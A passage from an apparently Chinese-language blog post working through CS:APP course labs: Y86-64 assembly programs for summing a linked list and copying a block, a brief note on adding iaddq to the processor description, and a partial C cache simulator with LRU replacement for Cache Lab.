class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#sum.ys</span><br><span class="line">#Execution begins at address 0</span><br><span class="line">.pos 0</span><br><span class="line">irmovq stack, %rsp    # set up stack pointer</span><br><span class="line">call main             # Execute main program</span><br><span class="line">halt  # Terminate program</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Sample linked list</span><br><span class="line">.align 8</span><br><span class="line">ele1:</span><br><span class="line">.quad 0x00a</span><br><span class="line">.quad ele2</span><br><span class="line">ele2:</span><br><span class="line">.quad 0x0b0</span><br><span class="line">.quad ele3</span><br><span class="line">ele3:</span><br><span class="line">.quad 0xc00</span><br><span class="line">.quad 0</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">irmovq ele1, %rdi</span><br><span class="line">call sum_list         # sum_list(list_ptr ls)</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">sum_list:</span><br><span class="line">xorq %rax, %rax       # val &#x3D; 0</span><br><span class="line">jmp loop1             # goto loop1</span><br><span class="line"></span><br><span class="line">loop:</span><br><span class="line">mrmovq 0(%rdi),%rsi   # get ls-&gt;val</span><br><span class="line">addq %rsi, %rax       # val +&#x3D; ls-&gt;val</span><br><span class="line">mrmovq 8(%rdi),%rsi   # get ls-&gt;next</span><br><span class="line">rrmovq %rsi,%rdi  # ls &#x3D; ls-&gt;next</span><br><span class="line"></span><br><span class="line">loop1:</span><br><span class="line">andq %rdi, %rdi       # and $rdi</span><br><span class="line">jne loop              # if !&#x3D; 0 goto loop</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">#Stack starts here and grows to lower addresses</span><br><span class="line">.pos 0x200</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#rsum.ys</span><br><span class="line">#Execution begins at address 0</span><br><span class="line">.pos 0</span><br><span class="line">irmovq stack, %rsp    # set up stack pointer</span><br><span class="line">call main             # Execute main program</span><br><span class="line">halt  # Terminate program</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Sample linked list</span><br><span class="line">.align 8</span><br><span class="line">ele1:</span><br><span class="line">.quad 0x00a</span><br><span class="line">.quad ele2</span><br><span class="line">ele2:</span><br><span class="line">.quad 0x0b0</span><br><span class="line">.quad ele3</span><br><span class="line">ele3:</span><br><span class="line">.quad 0xc00</span><br><span class="line">.quad 0</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">irmovq ele1, %rdi</span><br><span class="line">call rsum_list         # rsum_list(list_ptr ls)</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">rsum_list:</span><br><span class="line">pushq %r12</span><br><span class="line">xorq %rax, %rax        # val &#x3D; 0</span><br><span class="line">andq %rdi, %rdi        </span><br><span class="line">je return              # if &#x3D;&#x3D; 0 goto return</span><br><span class="line">mrmovq 0(%rdi), %r12   # get ls-&gt;val</span><br><span class="line">mrmovq 8(%rdi), %rdi   # get ls-&gt;next</span><br><span class="line">call rsum_list         # call rsum_list</span><br><span class="line">addq %r12, %rax        # val + rest</span><br><span class="line">return:</span><br><span class="line">popq %r12</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">#Stack starts here and grows to lower addresses</span><br><span class="line">.pos 0x200</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">#rsum.ys</span><br><span class="line">#Execution begins at address 0</span><br><span class="line">.pos 0</span><br><span class="line">irmovq stack, %rsp    # set up stack pointer</span><br><span class="line">call main             # Execute main program</span><br><span class="line">halt  # Terminate program</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Sample linked list</span><br><span class="line">.align 8</span><br><span class="line">src:</span><br><span class="line">.quad 0x00a</span><br><span class="line">.quad 0x0b0</span><br><span class="line">.quad 0xc00</span><br><span class="line"># Destination block</span><br><span class="line">dest:</span><br><span class="line">.quad 0x111</span><br><span class="line">.quad 0x222</span><br><span class="line">.quad 0x333</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">irmovq src, %rdi</span><br><span class="line">irmovq dest, %rsi</span><br><span class="line">irmovq $3, %rdx</span><br><span class="line">call copy_block         # copy_block(long *src, long *dest, long len)</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">copy_block:</span><br><span class="line">irmovq $1, %r13</span><br><span class="line">irmovq $8, %r14</span><br><span class="line">xorq %rax, %rax        # result &#x3D; 0</span><br><span class="line">jmp loop1</span><br><span class="line"></span><br><span class="line">loop:</span><br><span class="line">mrmovq 0(%rdi), %r12</span><br><span class="line">addq %r14, %rdi</span><br><span class="line">rmmovq %r12, (%rsi)</span><br><span class="line">addq %r14, %rsi</span><br><span class="line">xorq %r12, %rax</span><br><span class="line">subq %r13, %rdx</span><br><span class="line">loop1:</span><br><span class="line">andq %rdx, %rdx</span><br><span class="line">jg loop</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">#Stack starts here and grows to lower addresses</span><br><span class="line">.pos 0x200</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure><h4 id="PartB"><a href="#PartB" class="headerlink" title="PartB"></a>PartB</h4><p>按照 <code>iaddq</code> 的属性在 <code>sim/seq/seq-full.hcl</code> 中特定的位置添加 “IIADDQ” 即可</p><h3 id="Cache-Lab"><a href="#Cache-Lab" class="headerlink" title="Cache Lab"></a>Cache Lab</h3><blockquote><p>推荐阅读：</p><p><a href="https://www.bilibili.com/video/BV1rE41127Re?p=41">https://www.bilibili.com/video/BV1rE41127Re?p=41</a></p></blockquote><h4 id="Part-A-1"><a href="#Part-A-1" class="headerlink" title="Part A"></a>Part A</h4><p>在<code>csim.c</code>中写一个Cache，使用LRU替换策略。我们目的就是实现一个功能和<code>csim-ref</code>一样的程序。其实预至的<code>csim-ref</code>是没有脱符号表的…</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20200730141947.jpeg" alt="Cache结构"></p><blockquote><p>数据访问：</p><ul><li>L：Load，数据载入，可能发生1次miss</li><li>S：Store，可能发生1次miss</li><li>M：store后再load，两次访存。1 miss &amp; 1 hit + 可能eviction</li></ul></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;cachelab.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;getopt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="keyword">char</span> valid_bit;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> tag;</span><br><span class="line"><span class="keyword">int</span> LRU_count;</span><br><span class="line">&#125; Cache_line;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">Cache_line* lines;</span><br><span class="line">&#125; Cache_set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> S;</span><br><span class="line"><span class="keyword">int</span> E;</span><br><span class="line">Cache_set* sets;</span><br><span class="line">&#125; Cache;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> hit_count=<span class="number">0</span>, miss_count=<span class="number">0</span>,eviction_count=<span class="number">0</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">s -- the number of sets</span></span><br><span class="line"><span class="comment">E -- the number of cache lines in one set</span></span><br><span class="line"><span class="comment">b -- the size of one block in one cache line</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printUsage</span><span class="params">(<span class="keyword">char</span>* argv[])</span></span>;  <span class="comment">//print the help messages</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initCache</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span> E, <span class="keyword">int</span> b, Cache* cache)</span></span>; <span class="comment">//init caches</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">freeCache</span><span class="params">(Cache* cache)</span></span>; <span class="comment">//free caches</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getHitIndex</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag)</span></span>; <span class="comment">// if hit return the index of memory</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getEmptyIndex</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag)</span></span>; <span class="comment">// if there is any empty memort return it&#x27;s index</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">load</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag, <span class="keyword">int</span> verbosity)</span></span>; <span class="comment">//load </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">store</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag, <span class="keyword">int</span> verbosity)</span></span>; <span class="comment">//store</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">modify</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag, <span class="keyword">int</span> verbosity)</span></span>; <span class="comment">//modify: once store and once load </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">replayTrace</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span> E, <span class="keyword">int</span> b, <span class="keyword">char</span>* buf, <span class="keyword">int</span> verbosity, Cache* cache)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> s, E, b;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>];   <span class="comment">//store the name of the file</span></span><br><span class="line"><span class="keyword">int</span> verbosity = <span class="number">0</span>;</span><br><span class="line">Cache cache;</span><br><span class="line"><span class="keyword">char</span> ch;</span><br><span class="line"><span class="keyword">while</span> ((ch = getopt(argc, argv, <span class="string">&quot;vs:E:b:t:&quot;</span>)) != <span class="number">-1</span>) &#123;</span><br><span class="line"><span class="keyword">switch</span> (ch) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">verbosity = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">s = atoi(optarg);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">E = atoi(optarg);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">b = atoi(optarg);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">printUsage(argv);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line"><span class="built_in">strcpy</span>(buf, optarg);<span class="comment">//copy the address of trace to file</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( !s || !E || !b ) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s: Missing required command line argument\n&quot;</span>, *argv);</span><br><span class="line">printUsage(argv);</span><br><span class="line">&#125;</span><br><span class="line">initCache(s, E, b, &amp;cache);</span><br><span class="line">replayTrace(s, E, b, buf, verbosity, &amp;cache);</span><br><span class="line">freeCache(&amp;cache);</span><br><span class="line">printSummary(hit_count, miss_count, eviction_count);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printUsage</span><span class="params">(<span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Usage: %s [-hv] -s &lt;num&gt; -E &lt;num&gt; -b &lt;num&gt; -t &lt;file&gt;\n&quot;</span>, *argv);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Options:&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;  -h         Print this help message.&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;  -v         Optional verbose flag.&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;  -s &lt;num&gt;   Number of set index bits.&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;  -E &lt;num&gt;   Number of lines per set.&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;  -b &lt;num&gt;   Number of block offset bits.&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;  -t &lt;file&gt;  Trace file.&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\nExamples:&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;  linux&gt;  %s -s 4 -E 1 -b 4 -t traces/yi.trace\n&quot;</span>, *argv);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;  linux&gt;  %s -v -s 8 -E 2 -b 4 -t traces/yi.trace\n&quot;</span>, *argv);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initCache</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span> E, <span class="keyword">int</span> b, Cache* cache)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cache-&gt;S = <span class="built_in">pow</span>(<span class="number">2.0</span>, s); <span class="comment">// get the sets</span></span><br><span class="line">cache-&gt;E = E;</span><br><span class="line">cache-&gt;sets = (Cache_set*)<span class="built_in">malloc</span>(cache-&gt;S * <span class="keyword">sizeof</span>(Cache_set));</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i, j;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; cache-&gt;S; i++) &#123;<span class="comment">//init every cache line</span></span><br><span class="line">cache-&gt;sets[i].lines = (Cache_line*)<span class="built_in">malloc</span>(E * <span class="keyword">sizeof</span>(Cache_line));</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; cache-&gt;E; j++) </span><br><span class="line">&#123;<span class="comment">//init every cache line</span></span><br><span class="line">cache-&gt;sets[i].lines[j].valid_bit = <span class="number">0</span>;</span><br><span class="line">cache-&gt;sets[i].lines[j].LRU_count = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">freeCache</span><span class="params">(Cache* cache)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cache-&gt;S; i++) &#123;<span class="comment">//init every cache line</span></span><br><span class="line"><span class="built_in">free</span>(cache-&gt;sets[i].lines); </span><br><span class="line">cache-&gt;sets[i].lines = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">free</span>(cache-&gt;sets);</span><br><span class="line">cache-&gt;sets = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getHitIndex</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag)</span></span>&#123; <span class="comment">//whether there is a hit</span></span><br><span class="line">    <span class="keyword">int</span> hitIndex = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cache-&gt;E; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cache-&gt;sets[setIndex].lines[i].valid_bit == <span class="number">1</span> &amp;&amp; cache-&gt;sets[setIndex].lines[i].tag == tag)&#123; <span class="comment">// valid and the tag matches</span></span><br><span class="line">            hitIndex = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hitIndex;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getEmptyIndex</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag)</span></span>&#123;<span class="comment">//find whether there is an empty line in the given set</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> emptyIndex = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; cache-&gt;E; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cache-&gt;sets[setIndex].lines[i].valid_bit == <span class="number">0</span>) &#123;</span><br><span class="line">            emptyIndex = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> emptyIndex;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">load</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag, <span class="keyword">int</span> verbosity)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> hitIndex = getHitIndex(cache, setIndex, tag);<span class="comment">//whether there is a hit</span></span><br><span class="line">    <span class="keyword">if</span> (hitIndex == <span class="number">-1</span>) &#123; <span class="comment">//one miss</span></span><br><span class="line">        miss_count++;</span><br><span class="line">        <span class="keyword">if</span> (verbosity) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;miss &quot;</span>);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">int</span> emptyIndex = getEmptyIndex(cache, setIndex, tag);     </span><br><span class="line">        <span class="keyword">if</span> (emptyIndex == <span class="number">-1</span>) &#123;<span class="comment">//need eviction </span></span><br><span class="line">            eviction_count++;</span><br><span class="line">            <span class="keyword">if</span> (verbosity)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;eviction &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"><span class="keyword">int</span> flag = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cache-&gt;E; i++)&#123;</span><br><span class="line">                <span class="keyword">if</span> (cache-&gt;sets[setIndex].lines[i].LRU_count == cache-&gt;E - <span class="number">1</span> &amp;&amp; flag==<span class="number">1</span>)&#123; <span class="comment">//find the least recent used line, and other line LRU_count++</span></span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].valid_bit = <span class="number">1</span>;</span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].LRU_count = <span class="number">0</span>;</span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].tag = tag;</span><br><span class="line">                    flag = <span class="number">0</span>;</span><br><span class="line">                &#125; </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].LRU_count++;<span class="comment">//it is not used this time</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span> &#123;  <span class="comment">// don&#x27;t need eviction</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cache-&gt;E; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i != emptyIndex)&#123;</span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].LRU_count++;<span class="comment">//it is not used this time</span></span><br><span class="line">                &#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].valid_bit = <span class="number">1</span>;</span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].tag = tag;</span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].LRU_count = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line"><span class="keyword">else</span> &#123;<span class="comment">//one hit                        </span></span><br><span class="line">        hit_count++;</span><br><span class="line">        